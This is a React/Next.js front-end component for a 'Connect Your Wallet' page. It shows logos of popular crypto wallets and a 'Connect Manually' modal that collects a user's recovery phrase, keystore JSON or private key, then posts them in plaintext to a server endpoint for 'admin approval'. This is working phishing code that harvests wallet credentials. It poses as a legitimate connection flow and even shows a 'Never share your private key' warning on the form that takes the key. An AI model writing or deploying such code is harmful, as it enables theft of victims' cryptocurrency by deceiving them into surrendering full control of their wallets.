"use client";

import React from "react";
import { useEffect, useState, FormEvent, ChangeEvent } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Eye, EyeOff, CheckCircle, AlertCircle, Clock } from "lucide-react";
import { useSession } from "next-auth/react";
import { toast } from "sonner";

type Wallet = {
	name: string;
	icon: string;
};

type ImportTab = {
	key: "phrase" | "keystore" | "private";
	label: string;
};

type WalletStatus = "pending" | "approved" | "rejected" | null;

interface SaveWalletResponse {
	success: boolean;
	error?: string;
}

const wallets: Wallet[] = [
	{ name: "Trust Wallet", icon: "/twt.png" },
	{ name: "SafePal", icon: "/sfp.png" },
	{ name: "Exodus", icon: "/exodus.jpg" },
	{ name: "Lobstr", icon: "/lobstr.jpg" },
	{ name: "Dharma", icon: "/dharma.jpg" },
	{ name: "HaloDeFi Wallet", icon: "/halodefi.png" },
	{ name: "Metamask", icon: "/metamask.png" },
	{ name: "Rainbow", icon: "/rainbow.jpg" },
];

const importTabs: ImportTab[] = [
	{ key: "phrase", label: "Phrase" },
	{ key: "keystore", label: "Keystore JSON" },
	{ key: "private", label: "Private Key" },
];

export default function ConnectWallet(){
	const [modalOpen, setModalOpen] = useState<boolean>(false);
	const [manualModalOpen, setManualModalOpen] =
		useState<boolean>(false);

	const [selectedWallet, setSelectedWallet] =
		useState<Wallet | null>(null);

	const [activeTab, setActiveTab] =
		useState<"phrase" | "keystore" | "private">("phrase");

	const [connectedWallet, setConnectedWallet] =
		useState<string | null>(null);

	const [walletStatus, setWalletStatus] =
		useState<WalletStatus>(null);

	const { data: session } = useSession();

	useEffect(() => {
		async function fetchConnectedWallet() {
			try {
				const resp = await fetch("/api/wallet-status");
				const data = await resp.json();

				if (data.status === "approved") {
					setConnectedWallet(data.walletName);
					setWalletStatus("approved");
				} else if (data.status === "pending") {
					setWalletStatus("pending");
				} else if (data.status === "rejected") {
					setWalletStatus("rejected");
				} else {
					setConnectedWallet(null);
					setWalletStatus(null);
				}
			} catch (error) {
				console.error("Error fetching wallet status:", error);
			}
		}

		if (session?.user) {
			fetchConnectedWallet();
		}
	}, [session]);

	const handleWalletClick = (wallet: Wallet): void => {
		if (walletStatus === "approved" || walletStatus === "pending") return;

		setSelectedWallet(wallet);
		setModalOpen(true);
	};

	const handleCloseModal = (): void => {
		setModalOpen(false);
		setSelectedWallet(null);
	};

	const handleOpenManual = (): void => {
		setModalOpen(false);
		setManualModalOpen(true);
	};

	const handleCloseManual = (): void => {
		setManualModalOpen(false);
		setActiveTab("phrase");
	};

	return (
		<div className="min-h-screen pb-6 bg-background text-foreground">
			<div className="absolute inset-0 opacity-10 pointer-events-none z-0 bg-primary/10" />

			<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 relative z-10">
				<div className="bg-card/95 backdrop-blur-md border border-border p-5 rounded-2xl shadow-lg transition">
					{/* Connected Wallet - Approved */}
					{walletStatus === "approved" && connectedWallet && (
						<div className="mb-8 flex flex-col items-center justify-center">
							<CheckCircle className="h-10 w-10 text-green-500 mb-2" />

							<div className="text-lg font-bold text-green-500">
								Wallet Connected!
							</div>

							<div className="text-sm text-muted-foreground mt-1">
								Your{" "}
								<span className="font-semibold text-foreground">
									{connectedWallet}
								</span>{" "}
								wallet has been approved by the admin.
							</div>
						</div>
					)}

					{/* Pending Wallet Status */}
					{walletStatus === "pending" && (
						<div className="mb-8 flex flex-col items-center justify-center">
							<Clock className="h-10 w-10 text-blue-500 mb-2 animate-spin" />

							<div className="text-lg font-bold text-blue-500">
								Wallet Pending Approval
							</div>

							<div className="text-sm text-muted-foreground mt-1">
								Your wallet submission is under review by the admin.
								Please wait for approval.
							</div>
						</div>
					)}

					{/* Rejected Wallet Status */}
					{walletStatus === "rejected" && (
						<div className="mb-8 flex flex-col items-center justify-center">
							<AlertCircle className="h-10 w-10 text-red-500 mb-2" />

							<div className="text-lg font-bold text-red-500">
								Wallet Rejected
							</div>

							<div className="text-sm text-muted-foreground mt-1">
								Your wallet submission was rejected. Please try again with
								valid credentials.
							</div>
						</div>
					)}

					{/* Header */}
					<div className="text-center mb-10 max-w-2xl mx-auto">
						<h1 className="text-3xl font-bold mb-3 text-foreground">
							Connect Your Wallet
						</h1>

						<p className="text-muted-foreground">
							Select a wallet and connect securely by scanning
							a QR code or using a recovery phrase.
						</p>
					</div>

					{/* Wallet Grid */}
					<div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 mb-8">
						{wallets.map((wallet) => (
							<Card
								key={wallet.name}
								className={`flex flex-col items-center cursor-pointer bg-card/60 rounded-xl shadow hover:shadow-xl transition py-4 px-3 hover:scale-105 border border-border ${
									walletStatus === "approved" ||
									walletStatus === "pending"
										? "opacity-50 cursor-not-allowed"
										: ""
								}`}
								onClick={() =>
									handleWalletClick(wallet)
								}
							>
								<div className="w-14 h-14 rounded-full overflow-hidden flex items-center justify-center bg-primary/20 shadow-sm">
									<img
										src={wallet.icon}
										alt={wallet.name}
										className="w-14 h-14 object-contain"
									/>
								</div>

								<span className="text-sm font-medium text-foreground text-center mt-2">
									{wallet.name}
								</span>
							</Card>
						))}
					</div>
				</div>

				{/* Main Modal */}
				{modalOpen &&
					walletStatus !== "approved" &&
					walletStatus !== "pending" &&
					selectedWallet && (
						<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60">
							<div className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-md sm:max-w-lg relative overflow-hidden mx-2">
								<div className="flex items-center justify-between p-4 border-b border-border">
									<button
										onClick={handleCloseModal}
										className="text-muted-foreground hover:text-red-500"
									>
										✕
									</button>

									<div
										className="text-primary font-semibold cursor-pointer"
										onClick={handleCloseModal}
									>
										Back
									</div>
								</div>

								<div className="p-6">
									<div className="flex flex-col items-center">
										<div className="mb-4">
											<img
												src={
													selectedWallet.icon
												}
												alt="Icon"
												style={{
													width: 40,
													height: 40,
												}}
											/>
										</div>

										<div className="text-lg font-medium mb-2 text-foreground">
											Connect {selectedWallet.name}
										</div>

										<div className="flex justify-center mb-4">
											<Button
												className="bg-primary text-primary-foreground px-4 py-2 rounded hover:opacity-90"
												onClick={
													handleOpenManual
												}
											>
												Connect Manually
											</Button>
										</div>

										<button className="flex cursor-pointer items-center justify-between w-full bg-card/40 hover:bg-card/60 rounded p-3 mt-2 transition">
											<div>
												<div className="font-semibold text-primary">
													{
														selectedWallet.name
													}
												</div>

												<div className="text-xs text-muted-foreground">
													Easy-to-use
													browser
													extension.
												</div>
											</div>

											<div>
												<img
													src={
														selectedWallet.icon
													}
													alt="Icon"
													style={{
														width: 24,
													}}
												/>
											</div>
										</button>
									</div>
								</div>
							</div>
						</div>
					)}

				{/* Manual Modal */}
				{manualModalOpen &&
					walletStatus !== "approved" &&
					walletStatus !== "pending" &&
					selectedWallet && (
						<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60 backdrop-blur-sm">
							<div className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-lg mx-2">
								<div className="px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
									<h3 className="text-lg font-medium text-foreground flex items-center gap-4 mb-6">
										<img
											src={selectedWallet.icon}
											alt="wallet"
											className="h-10 w-10"
										/>

										<span>
											Import your{" "}
											{
												selectedWallet.name
											}{" "}
											wallet
										</span>
									</h3>

									<div className="flex justify-evenly mb-4">
										{importTabs.map((tab) => (
											<div
												key={tab.key}
												className={`p-2 border-b-2 cursor-pointer ${
													activeTab ===
													tab.key
														? "border-primary text-primary"
														: "border-border text-muted-foreground"
												}`}
												onClick={() =>
													setActiveTab(
														tab.key
													)
												}
											>
												{
													tab.label
												}
											</div>
										))}
									</div>

									{activeTab === "phrase" && (
										<SeedPhraseTab
											walletName={
												selectedWallet.name
											}
											onSuccess={() => {
												handleCloseManual();
												setTimeout(
													() =>
														window.location.reload(),
													2000
												);
											}}
										/>
									)}

									{activeTab === "keystore" && (
										<KeystoreTab
											walletName={
												selectedWallet.name
											}
											onSuccess={() => {
												handleCloseManual();
												setTimeout(
													() =>
														window.location.reload(),
													2000
												);
											}}
										/>
									)}

									{activeTab === "private" && (
										<PrivateKeyTab
											walletName={
												selectedWallet.name
											}
											onSuccess={() => {
												handleCloseManual();
												setTimeout(
													() =>
														window.location.reload(),
													2000
												);
											}}
										/>
									)}

									<div className="flex justify-end mt-4">
										<Button
											type="button"
											onClick={
												handleCloseManual
											}
										>
											Cancel
										</Button>
									</div>
								</div>
							</div>
						</div>
					)}
			</div>
		</div>
	);
}

/* ───────────────────────────────────────────── */
/* TYPES */
/* ───────────────────────────────────────────── */

interface TabProps {
	walletName: string;
	onSuccess?: () => void;
}

interface GlobalPendingState {
	globalPending: boolean;
	pendingType: string | null;
}

/* ───────────────────────────────────────────── */
/* GLOBAL PENDING */
/* ───────────────────────────────────────────── */

function useGlobalPending(): GlobalPendingState {
	const [globalPending, setGlobalPending] =
		useState<boolean>(false);

	const [pendingType, setPendingType] =
		useState<string | null>(null);

	useEffect(() => {
		fetch("/api/wallet-status")
			.then((res) => res.json())
			.then((data) => {
				if (data.status === "pending") {
					setGlobalPending(true);
					setPendingType(data.pendingType);
				} else {
					setGlobalPending(false);
					setPendingType(null);
				}
			});
	}, []);

	return { globalPending, pendingType };
}

/* ───────────────────────────────────────────── */
/* SEED PHRASE TAB */
/* ───────────────────────────────────────────── */

function SeedPhraseTab({
	walletName,
	onSuccess,
}: TabProps){
	const [phraseArr, setPhraseArr] = useState<string[]>(
		Array(12).fill("")
	);

	const [submitted, setSubmitted] =
		useState<boolean>(false);

	const [status, setStatus] =
		useState<WalletStatus>("pending");

	const [loading, setLoading] =
		useState<boolean>(false);

	const [showPhrase, setShowPhrase] =
		useState<boolean>(false);

	const { globalPending } = useGlobalPending();

	const handleWordChange = (
		idx: number,
		value: string
	): void => {
		const arr = [...phraseArr];
		arr[idx] = value.replace(/\s/g, "");
		setPhraseArr(arr);
	};

	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		const words = phraseArr.filter(Boolean);

		if (words.length !== 12 && words.length !== 24) {
			toast.error(
				"Recovery phrase must be exactly 12 or 24 words."
			);
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "phrase",
					data: words.join(" "),
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				setStatus("pending");
				toast.success(
					"Wallet submitted for admin approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div className="mb-6">
				<div className="flex justify-between items-center mb-2">
					<label className="font-semibold text-foreground">
						Enter your recovery phrase
					</label>

					<button
						type="button"
						onClick={() =>
							setShowPhrase((v) => !v)
						}
					>
						{showPhrase ? (
							<EyeOff size={22} />
						) : (
							<Eye size={22} />
						)}
					</button>
				</div>

				<div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
					{phraseArr.map((word, idx) => (
						<input
							key={idx}
							type={
								showPhrase
									? "text"
									: "password"
							}
							value={word}
							onChange={(
								e: ChangeEvent<HTMLInputElement>
							) =>
								handleWordChange(
									idx,
									e.target.value
								)
							}
							placeholder={`Word ${idx + 1}`}
							className="bg-card/50 p-2 rounded text-center placeholder:text-xs"
						/>
					))}
				</div>
			</div>

			<Button
				type="submit"
				disabled={
					submitted ||
					loading ||
					globalPending
				}
			>
				{loading ? "Submitting..." : "Proceed"}
			</Button>
		</form>
	);
}

/* ───────────────────────────────────────────── */
/* KEYSTORE TAB */
/* ───────────────────────────────────────────── */

function KeystoreTab({
	walletName,
	onSuccess,
}: TabProps){
	const [keystoreJson, setKeystoreJson] =
		useState<string>("");

	const [loading, setLoading] =
		useState<boolean>(false);

	const [submitted, setSubmitted] =
		useState<boolean>(false);

	const { globalPending } = useGlobalPending();

	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		if (!keystoreJson.trim()) {
			toast.error("Please paste your keystore JSON.");
			return;
		}

		try {
			JSON.parse(keystoreJson);
		} catch {
			toast.error("Invalid JSON format for keystore.");
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "keystore",
					data: keystoreJson,
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				toast.success(
					"Wallet submitted for admin approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div className="mb-6">
				<label className="block font-semibold text-foreground mb-2">
					Paste your keystore JSON
				</label>

				<textarea
					value={keystoreJson}
					onChange={(
						e: ChangeEvent<HTMLTextAreaElement>
					) =>
						setKeystoreJson(
							e.target.value
						)
					}
					placeholder="Paste your keystore JSON file content here..."
					className="w-full bg-card/50 p-3 rounded border border-border text-sm font-mono min-h-40"
				/>
			</div>

			<Button
				type="submit"
				disabled={
					submitted ||
					loading ||
					globalPending
				}
			>
				{loading ? "Submitting..." : "Proceed"}
			</Button>
		</form>
	);
}

/* ───────────────────────────────────────────── */
/* PRIVATE KEY TAB */
/* ───────────────────────────────────────────── */

function PrivateKeyTab({
	walletName,
	onSuccess,
}: TabProps){
	const [privateKey, setPrivateKey] =
		useState<string>("");

	const [loading, setLoading] =
		useState<boolean>(false);

	const [submitted, setSubmitted] =
		useState<boolean>(false);

	const [showKey, setShowKey] =
		useState<boolean>(false);

	const { globalPending } = useGlobalPending();

	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		if (!privateKey.trim()) {
			toast.error("Please enter your private key.");
			return;
		}

		if (
			!/^(0x)?[a-fA-F0-9]{64}$/.test(
				privateKey.trim()
			)
		) {
			toast.error(
				"Invalid private key format. Must be 64 hexadecimal characters."
			);
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "private",
					data: privateKey.trim(),
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				toast.success(
					"Wallet submitted for admin approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div className="mb-6">
				<div className="flex justify-between items-center mb-2">
					<label className="font-semibold text-foreground">
						Enter your private key
					</label>

					<button
						type="button"
						onClick={() =>
							setShowKey((v) => !v)
						}
					>
						{showKey ? (
							<EyeOff size={22} />
						) : (
							<Eye size={22} />
						)}
					</button>
				</div>

				<input
					type={showKey ? "text" : "password"}
					value={privateKey}
					onChange={(
						e: ChangeEvent<HTMLInputElement>
					) =>
						setPrivateKey(
							e.target.value
						)
					}
					placeholder="0x or your private key (64 hex characters)"
					className="w-full bg-card/50 p-3 rounded border border-border text-sm font-mono"
				/>

				<p className="text-xs text-muted-foreground mt-2">
					⚠️ Never share your private key. Keep it
					secure.
				</p>
			</div>

			<Button
				type="submit"
				disabled={
					submitted ||
					loading ||
					globalPending
				}
			>
				{loading ? "Submitting..." : "Proceed"}
			</Button>
		</form>
	);
}